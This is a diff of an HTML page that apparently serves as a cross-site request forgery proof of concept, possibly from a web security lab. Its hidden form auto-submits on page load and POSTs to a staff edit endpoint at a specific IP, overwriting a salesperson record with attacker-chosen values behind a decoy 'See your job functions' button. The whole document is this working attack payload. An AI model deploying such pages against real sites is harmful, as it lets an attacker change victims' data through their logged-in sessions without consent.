@@ -8,7 +8,7 @@
     <title>Document</title>
 </head>
 
-<body>
+<body onload="document.csrfForm.submit()">
     <form name="csrfForm" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=1" method="POST>
         <input type="hidden" name="first_name" value="Alice">
         <input type="hidden" name="last_name" value="Hacker">
@@ -16,9 +16,9 @@
         <input type="hidden" name="email" value="hacker@gmail.com">
         <input type="submit" value="See your job functions">
     </form>
-    <script>
+<!--     <script>
         document.csrfForm.submit();
-    </script>
+    </script> -->
 </body>
 
 </html>
